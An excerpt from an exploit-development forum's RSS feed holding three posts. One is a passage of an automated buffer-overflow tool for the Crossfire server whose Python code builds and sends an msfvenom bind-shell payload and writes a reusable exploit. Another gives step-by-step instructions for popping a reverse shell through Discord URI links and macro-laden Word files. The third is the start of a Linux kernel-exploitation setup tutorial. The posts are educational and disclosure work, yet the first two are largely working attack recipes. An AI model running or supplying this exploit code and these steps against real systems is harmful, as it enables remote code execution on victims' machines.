"e2","e3","e4","e5","e6","e7","e8","e9","ea","eb","ec","ed","ee","ef","f0","f1","f2","f3","f4","f5","f6","f7","f8","f9","fa","fb","fc","fd","fe"]
bufCount = 0
allchars_unsure_hex = []
allchars_unsure_text = []
while(len(allchars_hex) &gt; 4):
 section_hex = allchars_hex[3] + allchars_hex[2] + allchars_hex[1] + allchars_hex[0]
 section_text = allchars_text[0] + allchars_text[1] + allchars_text[2] + allchars_text[3]
 bufCount = bufCount + 1
 section_text = section_text.replace("\\", "")
 section_text = section_text.replace("x", "")
 section_text = "0x" + section_text
 if(not argSilent):
  print section_text, "Section being searched for in memory"
 newBuffer = start + "BBBB" + section_hex + ("\x41" * (offset-8)) + "CCCC" + (shellSpace * "/x41") + end

 s = socket.socket()
 s.connect((host, port))
 s.send(newBuffer)
 time.sleep(.6)
 bufFile = open("/usr/games/crossfire/bin/badchars.txt", "r")
 badData = bufFile.read()

 firstEggLocation = badData.find("0x42424242") + 11
 lastEggLocation = badData.find("0x41414141")
 badData = badData[firstEggLocation:lastEggLocation]
 if(not argSilent):
  print "-----stack------"
  print badData
  print "------------------"

 if(section_text in badData):
  allchars_text = allchars_text[4:]
  allchars_hex = allchars_hex[4:]
  continue
 else:
  if(not argSilent):
   print "BAD CHARACTER DETECTED IN ", section_text
  #move to unsure variabless
  allchars_unsure_text =  allchars_unsure_text + allchars_text[:4]
  allchars_unsure_hex =  allchars_unsure_hex + allchars_hex[:4]
  allchars_text = allchars_text[4:]
  allchars_hex = allchars_hex[4:]

allchars_unsure_hex = allchars_unsure_hex + allchars_hex
allchars_unsure_text = allchars_unsure_text + allchars_text
if(not argSilent):
 print "unsure values are", allchars_unsure_text
 print "---Verifying Bad Characters ---"
#Final Badchar Verification Phase
while(len(allchars_unsure_hex) &gt; 0):
 section_hex = "\x41" + "\x41" + "\x41" + allchars_unsure_hex[0]
 section_text = allchars_unsure_text[0] + "414141"
 section_text = section_text.replace("\\", "")
 section_text = section_text.replace("x", "")
 section_text = "0x" + section_text
 if(not argSilent):
  print section_text, "Section being searched for in memory"
 newBuffer = start + "BBBB" + section_hex + ("\x41" * (offset-8)) + "CCCC" + (shellSpace * "/x41") + end

 s = socket.socket()
 s.connect((host, port))
 s.send(newBuffer)
 time.sleep(.6)
 bufFile = open("/usr/games/crossfire/bin/badchars.txt", "r")
 badData = bufFile.read()

 firstEggLocation = badData.find("0x42424242") + 11
 lastEggLocation = badData.find("0x41414141")
 badData = badData[firstEggLocation:lastEggLocation]

 if(not argSilent):
  print "-----stack------"
  print badData
  print "------------------"

 if(section_text in badData):
  allchars_unsure_hex = allchars_unsure_hex[1:]
  allchars_unsure_text = allchars_unsure_text[1:]
 else:
  if(not argSilent):
   print "BADCHAR VERIFIED:", allchars_unsure_text[0]
  badchars_hex.append(allchars_unsure_hex[0])
  badchars_text.append(allchars_unsure_text[0])
  allchars_unsure_hex = allchars_unsure_hex[1:]
  allchars_unsure_text = allchars_unsure_text[1:]
  continue

if(not argSilent):
 print "Badchar Detection Complete!"
 print "Bad Characters:", badchars_text
print "Acquiring JMP ESP..."
</code></pre>
<hr>
<p>This was one of the hardest parts of the program for me to make, as I had no idea whatsoever how to dump and access the relevant memory with gdb. I take a list of every possible ascii character value in hex, and send them in groups of 4 to the service to see if they display properly in memory. If they do, great! If not, one of those 4 characters is a ‘bad character’ and needs to be avoided when I generate my payload. So I add all 4 characters to an array of possible bad characters (since I don’t know which character is the bad one), whenever the expected character sequence fails to appear in memory.</p>
<p>I then do another pass at the service with the allchars_unsure array as my value library, sending each byte in a sequence paired with 3 A’s. Since my program operates under the assumption that A’s are valid characters, I know exactly what to look for. I found this to be a good compromise to approaching this problem, as one bad character can corrupt all of the output after it. I found groups of 4 bytes to be the most convenient to look for and parse with my debugger script, and that’s what I went with. This is probably also where my project falls the farthest from its goal of being an automated buffer overflow generator, since it’s possible a bad character could be invalid but display correctly in memory, and only corrupt the rest of the sequence. In this case, my program would fail to detect 1 out of every 4 such bad characters at a minimum.</p>
<hr>
<pre><code class="lang-python">bufFile = open("/usr/games/crossfire/bin/jmpSearch.txt", "r")
jmpData = bufFile.read()
jmpData = '\n'.join(jmpData.split('\n')[1:])

offset1 = jmpData[8:10].decode("hex")
offset2 = jmpData[6:8].decode("hex")
offset3 = jmpData[4:6].decode("hex")
offset4 = jmpData[2:4].decode("hex")
eipString = offset1 + offset2 + offset3 + offset4
badlist = ""
while (len(badchars_text) &gt; 0):
 badlist = badlist + badchars_text[0]
 badchars_text.pop(0)

badlist = "\\x" + badlist[0:2] + "\\x" + badlist[2:4] + "\\x" + badlist[4:6] + "\\x" + badlist[6:8]
argPayloadAttempts = int(argPayloadAttempts)
bashCommand = "msfvenom -p linux/x86/shell_bind_tcp LPORT=" + argShellPort + " -f raw -b \"" + badlist + "\" -e x86/shikata_ga_nai -o shellcode.txt"
#Payload JMP Offset Detection Phase
eaxLength = len(start)-2
jmpEAXCommand = "(echo \"add eax, "+ str(eaxLength) + "\") | exec /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb &gt; eaxHelp.txt 2&gt;/dev/null"
os.system(jmpEAXCommand)
bufFile = open("eaxHelp.txt")
eaxValue = bufFile.read()
eaxValue = eaxValue.replace("nasm","")
eaxValue = eaxValue.replace(" 00000000 ","")
eaxValue = eaxValue.replace("add eax,byte +0xc","")
eaxValue = eaxValue.replace(" ","")
eaxValue = eaxValue.replace("\n","")
eaxValue = eaxValue.replace("&gt;"," ")
eaxValue = eaxValue[9:]
eaxLength2 = len(eaxValue)
eaxValue = eaxValue[:eaxLength2-9]
eaxLength2 = len(eaxValue)
retString = ""
control = 0
while(eaxLength2 &gt; 0):
 retString = retString + "\\x" + eaxValue[control:control+2]
 eaxLength2 = eaxLength2-2
 control = control + 2
retString = retString.lower()
oldString = retString
retString = retString.decode("string_escape")
</code></pre>
<hr>
<p>My debugger script has helpfully created a file that contains a valid JMP ESP for us to hijack. So we use that, as well as the other information we’ve gathered so far, in order to create a bash command that will generate a payload. Additionally, since the service I was testing this code against only had 11 bytes of post-offset shellcode space, I decided to have the program assume there will never be enough space after the offset value to insert a payload, and to instead put the payload at the beginning of the buffer, and assume that there will be enough space after the offset to include a JMP instruction to redirect execution to that location. I use another one of Metasploit’s tools for this, albeit very messily.</p>
<hr>
<pre><code class="lang-python"> if(not argSilent):
  print "--- Building Payload ---"
 os.system(bashCommand)
 bufFile = open("shellcode.txt", "r")
 shellcode = bufFile.read()
 newBuffer = start + shellcode + ("\x41" * (offset-len(shellcode))) + eipString + retString + ("\xff\xe0\x90\x90") + end #the hardcoded values tell the program to jump to the prior variable value
 if(not argSilent):
  print "----------------------"
  print "Deploying Payload..."
 s = socket.socket()
 s.connect((host, port))
 s.send(newBuffer)
 if(not argSilent):
  print("--- Initiating Bind Shell Connection ---")
 time.sleep(.6)
 output =  os.system("nc -v "+argLocalIP+" "+argShellPort)
 if(output == 0 or output == 2):
  argPayloadAttempts = 0
  payloadSuccess = True
 else:
  print "Connection Failure!"
  argPayloadAttempts = argPayloadAttempts - 1
if(not payloadSuccess):
 if(not argSilent):
  print "Payload Deployment Failed. Exiting program"
sys.exit()
</code></pre>
<hr>
<p>This is the (most) fun part! We try to build a payload, deploy it, and catch a shell. We try this a user specified number of times, using the same copy-pasted socket code as always.</p>
<hr>
<pre><code class="lang-python">###Build PayloadFile####
os.system("mv shellcode.txt " + argExploitName[0:3] +"Shellcode.txt")
shebang = "#!/usr/bin/python"
load = "import socket, os, time"
output = "output = 256"
outText = "print \"--- Spawning Shell ---\""
host = "host = \"" + str(argTargetIP) + "\""
port = "port = " + str(argTargetPort)
fileStart = "start = \"" + argStart.encode("string_escape") + "\""
fileEnd = "end = \"" + argEnd.encode("string_escape") + "\""
valOverwrite = "eipString = \"" + eipString.encode("string_escape") + "\""
jmpEax = "jmpEax = \"" + oldString + "\xff\xe0\x90\x90\"".encode("string_escape")
bufOne = "bufFile = open(\"" + argExploitName[0:3] + "Shellcode.txt" + "\", \"r\")"
bufTwo = "shellcode = bufFile.read()"
flow = "flow = \"A\" * " + str(offset-len(shellcode))
code = "buffer = (start + shellcode + flow + eipString + jmpEax + end)"
loopMe = "while(output == 256):"
networking1 = "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"
networking2 = "s.connect((host, port))"
networking3 = "s.send(buffer)"
networking4 = "os.system(\"nc -v " + str(argTargetIP) + " " + str(argShellPort) + " 2&gt;/dev/null\")" #TODO change argShellPort to a more logical name, like argShellPort
ductTape = "time.sleep(.6)"
fullExploit = shebang + "\n" + load + "\n" + output + "\n" + host  + "\n" + port  + "\n" + fileStart + "\n" + flow + "\n" + fileEnd + "\n" + valOverwrite + "\n" + jmpEax + "\n" + bufOne + "\n" + bufTwo + "\n" + code  + "\n" + outText + "\n" + loopMe +  "\n " + networking1 + "\n " + networking2 + "\n " + networking3 + "\n " + ductTape + "\n " + networking4 + "\n "
savedExploit = open(argExploitName, "w")
savedExploit.write(fullExploit)
savedExploit.close()
if(not argSilent):
 print "----------------------"
 print "Exploit saved as " + argExploitName + ", please keep in the same directory as " +  (argExploitName[0:3] + "Shellcode.txt")
os.system("rm eaxHelp.txt")
os.system("rm offset.txt")
</code></pre>
<hr>
<p>We now save a very bad replica of this exploit we just made for later use. The buffer stays in a special file of its own because I couldn’t figure out how to properly write it to a single a file without encoding issues that cause the exploit to fail. Additionally, even though it should theoretically work on the first try (given we’re using the exact same buffer that worked before), it sometimes takes upwards of a minute’s worth of attempts to successfully exploit the service. I have no idea why. Maybe address space layout randomization, even though I thought I disabled that in my environment? Who knows! Also we delete a few temporary files we don’t need anymore and exit.</p>
<hr>
<pre><code class="lang-python">#!gdb
import sys
import gdb
import os
os.system("echo resetFile &gt; eip.txt")
number_restarts = 100
gdb.execute("set pagination off")
os.system("/usr/share/metasploit-framework/vendor/bundle/ruby/2.3.0/gems/rex-bin_tools-0.1.4/bin/msfelfscan -j esp ./crossfire &gt; jmpSearch.txt")
def on_stop(sig):
  global number_restarts
  if isinstance(sig, gdb.SignalEvent):
    if (number_restarts &gt; 0):
      os.system("rm eip.txt")
      gdb.execute("set confirm off")
      gdb.execute("set logging file eip.txt")
      gdb.execute("set logging on")
      gdb.execute("set logging overwrite on")
      gdb.execute("info registers eip")
      gdb.execute("set logging off")
      gdb.execute("set logging file badchars.txt")
      gdb.execute("set logging on")
      gdb.execute("x/500xw $esp")
      gdb.execute("set logging overwrite off")
      gdb.execute("set logging off")
      gdb.execute("kill")
      gdb.execute("run")
gdb.events.stop.connect (on_stop)
gdb.execute("run")
</code></pre>
<hr>
<p>Lastly, we have my debugger script. On startup, it wipes anything from past exploit attempts and dumps a list of hijackable ESP’s for the main program to use. Additionally, whenever the program crashes for any reason whatsoever, it dumps the EIP registry and 500 lines of stack memory for usage by my main program.</p>
<hr>
<p>That’s pretty much it. You’re welcome to adapt or use this code for your own purposes, if you think it has any value. I’m reasonably confident I could emulate the restart script with mona and have it work with immunity debugger, and thus be cross platform. In such a case, this tool may be functional (with some work) on the OSCP exam. I’m not sure whether or not it would be allowed though, since then you wouldn’t actually have to know what you’re doing in order to pass that portion of the test. That being said, given my poor programming ability (and the scarcity of these exploits in the wild), it would also be reasonable to assume there isn’t much value to my project outside of it being a wonderful learning experience for me. If anyone has any questions, I will add them to my Q&amp;A, and please feel free to ask whatever comes to mind.</p>
<p>Here’s a screenshot of my program in action: <a href="https://i.imgur.com/POnukSS.png" rel="nofollow noopener">https://i.imgur.com/POnukSS.png</a></p>
<p>Q&amp;A</p>
<hr>
<p>Q: Why did you write this in Python 2.7?</p>
<p>A: I didn’t actually know I wasn’t using the latest version of python until I had already committed to writing it in 2.7, which was the default version of python on my Linux distro. If Backbox/Kali used 3.0 by default this would have been written in that.</p>
<p>Q: What are those ugly sleep statements for? Why do your scripts communicate by reading and writing to local files?</p>
<p>A: I’m kind of self conscious about this because I’m pretty sure it’s a garbage way to solve this problem, but when I was trying to figure out how to have my scripts interact with each other at all this was the first thing I thought of and it’s what I did.</p>
<hr>
            <p><small>19 posts - 7 participants</small></p>
            <p><a href="https://0x00sec.org/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415</link>
          <pubDate>Fri, 03 May 2019 23:29:28 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-13415</guid>
          <source url="https://0x00sec.org/t/autobof-a-journey-into-automation-exploit-development-and-buffer-overflows/13415.rss">autoBOF: a Journey into Automation, Exploit Development, and Buffer Overflows</source>
        </item>
        <item>
          <title>Using URI to pop shells via the Discord Client</title>
          <dc:creator><![CDATA[RagSec]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/00d493679a22eaab33a03bd4ac8e66b24a6ddfdb.png" alt="" width="" height=""></p>
<p><strong>Introduction</strong></p>
<p>Myself and a fellow researcher: Styx were the leads on this research and we were backed up by <a href="https://www.twitter.com/cybersecstu" rel="noopener nofollow ugc">CyberSecStu</a>, and <a href="https://www.twitter.com/5w0rdFish" rel="noopener nofollow ugc">5w0rdFish</a> from <a href="https://themanyhats.club" rel="noopener nofollow ugc">The Many Hats Club</a>. We discovered a vulnerability within the Discord client that enabled an attacker to call local programs on a target system. We then took this flaw and used it to pivot through MS-Word macros to start a reverse TCP shell automatically from the discord client.</p>
<p><strong>Understanding</strong></p>
<p>What is Uniform Resource Identifier (URI)?<br>
A Uniform Resource Identifier (URI) is a string of characters that unambiguously identifies a particular resource. To guarantee uniformity, all URIs follow a predefined set of syntax rules, but also maintain extensibility through a separately defined hierarchical naming scheme (e.g. “http://”).</p>
<p>We were informed by a third party that the discord client will accept URI schemes as links if you put it in &lt;&gt;</p>
<p>For more information check out Shay’s work on different methods of URI abuse in Discord <a href="https://drive.google.com/file/d/1SCTj4WZo8VlitrAazPCueGz3Gg60jG5d/view" rel="noopener nofollow ugc">here</a></p>
<p>So when Discord is passed a URI like below</p>
<p><em>&lt;[URI Scheme]://[Random Input]&gt;</em></p>
<p>It would enable us to call local applications. For example:</p>
<p><em><a href="https://0x00sec.org">calculator://a</a></em></p>
<p>This would be interpreted by Discord as a link and when clicked would cause the calculator application to execute and open on the local machine.</p>
<p>Styx and I then began researching into URIs and the types of requests we could make. This leads us to the <a href="https://www.iana.org/assignments/uri-schemes/uri-schemes.xhtml" rel="noopener nofollow ugc">IANA URI Schemes</a>. From there we began enumerating which of the URI’s we could execute and which fail.</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8beb5978b8abf632343cfadaf96fdd9df6dada3a.png" alt="" width="" height=""></p>
<p>An example of the URI testing</p>
<p>If the URI was requesting something that wasn’t installed on the host system it would display the below message. For example:</p>
<p><em><a href="https://0x00sec.org">afp://a</a></em></p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7d0fcf866039e77153a9cc824da4e960a0701dc4.png" alt="" width="" height=""></p>
<p>Failed to call AFP</p>
<p>We soon discovered that you could make all sorts of local programs open. Some of the most interesting being: all of the ms-office applications <em><a href="https://0x00sec.org">ms-word://a</a></em>, basic windows applications eg. Calculator <em><a href="https://0x00sec.org">calculator://a</a></em> or Mail <em><a href="https://0x00sec.org">mailto://a</a></em> , browsers using FTP <em><a href="https://0x00sec.org">FTP://127.0.0.1</a></em> or Chrome using <em><a href="https://0x00sec.org">chrome://a</a></em> among many others.</p>
<p>Something we found that was interesting was the ability to open windows media player and have it stream audio from the internet using where it would again just automatically open and connect without prompting the victim.</p>
<p>While enumerating the inputs for the URI links we discovered that it accepted UTF-8 encoded text so knowing this we could specific arguments and URLs after the service indicator.</p>
<p><strong>Exploitation</strong></p>
<p>As discussed above we are able to call Microsoft Office programs. So we began looking further into this and it gives us the ability to automatically open remote files using <em>&lt;ms-word://[file location]&gt;</em>. So this means we can run potentially infected files with VBA macros.<br>
So we took this idea and attempted to test it.</p>
<p>Step 1, Use <a href="https://www.trustedsec.com/social-engineer-toolkit-set/" rel="noopener nofollow ugc">SET</a> to generate a Powershell Reverse Shell</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/07b8e32becf62e193be502c3245137042b78aae1.png" alt="" width="" height=""></p>
<p>Use Option 1 – Social-Engineering Attacks</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/af4d0634b14ba2799b2861bbce34fc3176709dbb.png" alt="" width="" height=""></p>
<p>Use Option 9 – Powershell Attack Vector</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/0/03ca56d042c0fb5184e4163bfaa6afd53d6de0f7.png" alt="" width="" height=""></p>
<p>Use Option 2 – Powershell Reverse Shell</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e4b1292f3f8493509c2cfc4037438975a84707fd.png" alt="" width="" height=""></p>
<p>Type in your IP Address</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/ebf7e5c23afa2c5f27e5babc1d915056784b872a.png" alt="" width="" height=""></p>
<p>Specify a port for the shell to use</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/e52fb391bf9a7a0a4d8aa68a1b922dbf9c609cfa.png" alt="" width="" height=""></p>
<p>You can choose to start a lister or not</p>
<p>Step 2, Upload the generated payload<br>
Using whatever service you want put the payload file on the internet so the macro which you can create later.</p>
<p>Step 3, Create the VBA Macro in the word document (.docm, .dotm)</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b975282c6ed2e9b31dcd7f63a6e17823079e4b60.png" alt="" width="" height=""></p>
<p>Here is an example of the macro</p>
<p>Step 4, Upload the word file<br>
Save the file and upload it to the same place as a the payload so it can also be called remotely<br>
Step 5,  Start listener if you haven’t already</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/adc05f2abe1d7cddfc7052658ae7e7f74dd5f66d.png" alt="" width="" height=""></p>
<p>Using netcat create a lister on port 4444 or whatever port you specified in SET</p>
<p>Step 6, Send victim URI<br>
<em>&lt;ms-word:nft%7Cu%7C[LOCATION OF WORD FILE]%7Cs%7Chttp://[LOCATION OF WORD FILE]&gt;</em></p>
<p><em>&lt;ms-word:nft|u|[LOCATION OF WORD FILE]|s|[LOCATION OF WORD FILE]&gt;</em></p>
<p>For more information regarding the ms-word URI goto <a href="https://docs.microsoft.com/en-us/office/client-developer/office-uri-schemes" rel="noopener nofollow ugc">this link</a></p>
<p>Step 7, GG Shell Popped! 1337 af</p>
<p><strong>Disclosure</strong></p>
<p>Once we had a functional PoC it was time to contact discord. We did so via Twitter and their Bug Bounty Disclosure page on their website. Following Correspondance, with Discord’s security team they discussed that the URI filtering issue wasn’t in the scope of their bug bounty scheme as it apparently classed under “Social Engineering”. However, they have pushed forward to dealing with the issue and elevating the patching action internally.</p>
<p><em>“However, given, this is the intended behaviour of how custom protocols work on computers in general, we don’t consider this a security vulnerability – and at best a social engineering attack, which is, unfortunately not covered by our bug-bounty” – Discord’s Security Team</em></p>
<p><strong>Conclusion</strong></p>
<p>In conclusion, the URI validation in the Discord Client is insufficient it should not be able to call local programs nor does it require that functionality. It just leaves discord users vulnerable to attack. All it would take is one really well-crafted piece of malware to be executed by one of the many accepted URIs and a victims machine can be directly affected. While the reverse shell or other functionality does not come directly from the discord client the client enables the attacker the ability to pivot through itself and affect the victims’ machine directly. Discord can likely solve this issue by implementing some degree of input validation when it comes to URI scheme, eg. filter all but HTTP and https as these are the only ones that make practical sense to a typical user to have access to.</p>
            <p><small>14 posts - 6 participants</small></p>
            <p><a href="https://0x00sec.org/t/using-uri-to-pop-shells-via-the-discord-client/11673">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/using-uri-to-pop-shells-via-the-discord-client/11673</link>
          <pubDate>Mon, 18 Feb 2019 16:27:47 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-11673</guid>
          <source url="https://0x00sec.org/t/using-uri-to-pop-shells-via-the-discord-client/11673.rss">Using URI to pop shells via the Discord Client</source>
        </item>
        <item>
          <title>Point of no C3 | Linux Kernel Exploitation - Part 0</title>
          <dc:creator><![CDATA[exploit]]></dc:creator>
          <category>Exploit Development</category>
          <description><![CDATA[
            <p>In the name of Allah, the most beneficent, the most merciful.</p>
<hr>
<p><strong>HAH</strong>IRRITATED<strong>AHAHAHAHAHAHAHA</strong><br>
<em>“Appreciate the art, master the craft.”</em><br>
<strong>AHAHAHAH</strong>OUTDATED<strong>AHAHAHAHAH</strong></p>
<p>It’s been more than a year, huh? but I’m back, with <em>“Point of no C3”</em>. It’s main focus will be <em>Kernel Exploitation</em>, but that won’t stop it from looking at other things.</p>
<p>Summary</p>
<ul>
<li>Chapter I: Environment setup:
<ul>
<li>Preparing the VM</li>
<li>Using KGDB to debug the kernel</li>
<li>Compiling a simple module</li>
<li>What?</li>
<li>Few structs</li>
<li>Debug a module</li>
</ul>
</li>
<li>Chapter II: Overview on security and General understanding:
<ul>
<li>Control Registers</li>
<li>SMAP</li>
<li>SMEP</li>
<li>Write-Protect</li>
<li>Paging(a bit of segmentation too)</li>
<li>Processes</li>
<li>Syscalls</li>
<li>IDT(Interrupt Descriptor Table)</li>
<li>KSPP</li>
<li>KASLR</li>
<li>kptr_restrict</li>
<li>mmap_min_addr</li>
<li>addr_limit</li>
</ul>
</li>
</ul>
<h4>Chapter I: <em>Environment setup</em>
</h4>
<p>“<em>No QEMU for you.</em>”</p>
<h5>Preparing the VM:</h5>
<p>To begin with, we would set up the environment and the VM’s in order to experiment on them.<br>
For this, <a href="https://cdimage.debian.org/debian-cd/current/amd64/iso-cd/" rel="noopener nofollow ugc"><em>Debian</em></a> was choosen(<em>core only</em>).<br>
Other choices include <em>SUSE</em> or <em>Centos</em>, etc.</p>
<pre><code class="lang-perl">debian-9.4.0-amd64-netinst.iso			2018-03-10 12:56 291M [X]
debian-9.4.0-amd64-xfce-CD-1.iso		2018-03-10 12:57 646M
debian-mac-9.4.0-amd64-netinst.iso		2018-03-10 12:56 294M
</code></pre>
<p>A VM is then created with atleast <strong>35GB</strong> space.(<em>Hey, It’s for compiling the kernel!</em>)</p>
<pre><code class="lang-perl">Installer disc image file (iso):
[C:\vm\debian-9.4.0-amd64-netinst.iso	[▼]]
⚠ Could not detect which operating system is in this disc image.
  You will need to specify which operating system will be installed.
</code></pre>
<p>Once you boot it, you can proceed with <em>Graphical Install</em>, and since we only want the core, stop at <em>Software selection</em> and have only <strong>SSH server</strong> and <strong>standard system utilities</strong> selected.<br>
And when it’s done, you’ll have your first VM ready.</p>
<pre><code class="lang-bash">
Debian GNU/Linux 9 Nwwz tty1
Hint: Num Lock on

Nwwz login: root
Password:
Linux Nwwz 4.9.0-6-amd64 #1 SMP Debian 4.9.88-1+deb9u1 (2018-05-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@Nwwz:~#
</code></pre>
<p>In order to get the latest stable Linux kernel release(<em>4.17.2 at the time of writing</em>) and run it.<br>
We would start by installing necessary packages:</p>
<pre><code class="lang-bash">apt-get install git build-essential fakeroot ncurses* libssl-dev libelf-dev ccache gcc-multilib bison flex bc
</code></pre>
<p>Downloading the kernel tarball and the patch:</p>
<pre><code class="lang-bash">root@Nwwz:~# cd /usr/src
root@Nwwz:/usr/src# wget "https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/linux-4.17.2.tar.gz"
root@Nwwz:/usr/src# wget "https://mirrors.edge.kernel.org/pub/linux/kernel/v4.x/patch-4.17.2.gz"
</code></pre>
<p>Extracting them:</p>
<pre><code class="lang-bash">root@Nwwz:/usr/src# ls
linux-4.17.2.tar.gz patch-4.17.2.gz
root@Nwwz:/usr/src# gunzip patch-4.17.2.gz
root@Nwwz:/usr/src# gunzip linux-4.17.2.tar.gz
root@Nwwz:/usr/src# tar -xvf linux-4.17.2.tar
</code></pre>
<p>Moving and applying the patch:</p>
<pre><code class="lang-bash">root@Nwwz:/usr/src# ls
linux-4.17.2 linux-4.17.2.tar patch-4.17.2
root@Nwwz:/usr/src# mv patch-4.17.2 linux-4.17.2/
root@Nwwz:/usr/src# cd linux-4*2
root@Nwwz:/usr/src/linux-4.17.2# patch -p1 &lt; patch-4.17.2
</code></pre>
<p>Cleaning the directory and copying the original bootfile to the current working directory and changing the config with an <em>ncurses</em> menu:</p>
<pre><code class="lang-bash">root@Nwwz:/usr/src/linux-4.17.2# make mrproper
root@Nwwz:/usr/src/linux-4.17.2# make clean
root@Nwwz:/usr/src/linux-4.17.2# cp /boot/config-$(uname -r) .config
root@Nwwz:/usr/src/linux-4.17.2# make menuconfig
</code></pre>
<p>One must then set up the following fields:</p>
<pre><code class="lang-auto">[*] Networking support 	---&gt;
    Device Drivers		---&gt;
	Firmware Drivers	---&gt;
	File systems		---&gt;
[X] Kernel hacking		---&gt;
		printk and dmesg options					---&gt;
	[X] Compile-time checks and compiler options	---&gt;
		...
		[*] Compile the kernel with debug info
		...
	...
	-*- Kernel debugging
	...
	[*] KGDB: kernel debugger
</code></pre>
<pre><code class="lang-auto">	Do you wish to save your new configuration?
	Press &lt;ESC&gt;&lt;ESC&gt; to continue kernel configuration.
			[&lt; Yes &gt;]			&lt; No &gt;
</code></pre>
<p>Make sure you do have similiar lines on .config:</p>
<pre><code class="lang-bash">CONFIG_STRICT_KERNEL_RWX=n
CONFIG_DEBUG_INFO=y
CONFIG_HAVE_HARDENED_USERCOPY_ALLOCATOR=n
CONFIG_HARDENED_USERCOPY=n
CONFIG_HARDENED_USERCOPY_FALLBACK=n
</code></pre>
<p>Before starting the compiling process, to faster the process, you can split the work to multiple jobs(<em>on different processors</em>). <strong>nproc</strong> would hand you the number of processing units available.</p>
<pre><code class="lang-bash">root@Nwwz:/usr/src/linux-4.17.2# nproc
4
root@Nwwz:/usr/src/linux-4.17.2# make -j4
</code></pre>
<p>It will then automatically go through <em>stage 1 &amp; 2</em>:</p>
<pre><code class="lang-bash">Setup is 17116 bytes (padded to 17408 bytes).
System is 4897 kB
CRC 2f571cf0
Kernel: arch/x86/boot/bzImage is ready	(#1)
	Building modules, stage 2.
	MODPOST	3330 modules
(SNIP)
	CC		virt/lib/irqbypass.mod.o
	LD [M]	virt/lib/irqbypass.ko
root@Nwwz:/usr/src/linux-4.17.2#
</code></pre>
<p>If somehow, there’s no <em>stage two</em>, a single command should be executed before moving on:<br>
(This normally isn’t required.)</p>
<pre><code class="lang-auto">make modules
</code></pre>
<p>Installing the modules:</p>
<pre><code class="lang-bash">root@Nwwz:/usr/src/linux-4.17.2# make modules_install
(SNIP)
	INSTALL	sound/usb/usx2y/snd-usb-usx2y.ko
	INSTALL	virt/lib/irqbypass.ko
	DEPMOD	4.17.0
root@Nwwz:/usr/src/linux-4.17.2#
</code></pre>
<p>Installing and preparing the kernel for boot:</p>
<pre><code class="lang-bash">root@Nwwz:/usr/src/linux-4.17.2# make install
(SNIP)
Found linux image: /boot/vmlinuz-4.17.0
Found initrd image: /boot/initrd.img-4.17.0
Found linux image: /boot/vmlinuz-4.9.0-6-amd64
Found initrd image: /boot/initrd.img-4.9.0-6-amd64
done
root@Nwwz:/usr/src/linux-4.17.2# cd /boot
root@Nwwz:/boot# mkinitramfs -o /boot/initrd.img-4.17.0 4.17.0
root@Nwwz:/boot# reboot
</code></pre>
<p>You can then choose the new kernel from the boot screen:</p>
<pre><code class="lang-auto">*Debian GNU/Linux, with Linux 4.17.0
 Debian GNU/Linux, with Linux 4.17.0 (recovery mode)
 Debian GNU/Linux, with Linux 4.9.0-6-amd64
 Debian GNU/Linux, with Linux 4.9.0-6-amd64 (recovery mode)
</code></pre>
<p>If it fails however, saying that it’s an out-of-memory problem, you can reduce the size of the boot image.</p>
<pre><code class="lang-bash">root@Nwwz:/boot# cd /lib/modules/4.17.0/
root@Nwwz:/lib/modules/4.17.0# find . -name *.ko -exec strip --strip-unneeded {} +
root@Nwwz:/lib/modules/4.17.0# cd /boot
root@Nwwz:/boot# mkinitramfs -o initrd.img-4.17.0 4.17.0
</code></pre>
<p>It’ll then boot successfully.</p>
<pre><code class="lang-auto">root@Nwwz:~# uname -r
4.17.0
</code></pre>
<h5>Using KGDB to debug the kernel:</h5>
<p>Installing <strong>ifconfig</strong> and running it would be the first thing to do:</p>
<pre><code class="lang-bash">root@Nwwz:~# apt-get install net-tools
(SNIP)
root@Nwwz:~# ifconfig
ens33: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu 1500
        inet 192.168.150.145  netmask 255.255.255.0  broadcast 192.168.150.255
(SNIP)
</code></pre>
<p>Back to <em>Debian</em> machine, transfering <strong>vmlinux</strong> to the host is done with SCP or WinSCP in my case.</p>
<pre><code class="lang-auto">root@Nwwz:~# service ssh start
</code></pre>
<pre><code class="lang-auto">..							Répertoire parent
vmlinux			461 761 KB	Fichier
</code></pre>
<p>With this, you’ll have debug symbols ready, but you still need to enable KGDB for the target kernel.</p>
<pre><code class="lang-bash">root@Nwwz:~# cd /boot/grub
root@Nwwz:/boot/grub# nano grub.cfg
</code></pre>
<p>Editing a single line, adding <em>__setup</em> arguments, we would then be able to manipulate the kernel for our needs, such as <em>disabling KASLR</em> and <em>enabling KGDB</em>.<br>
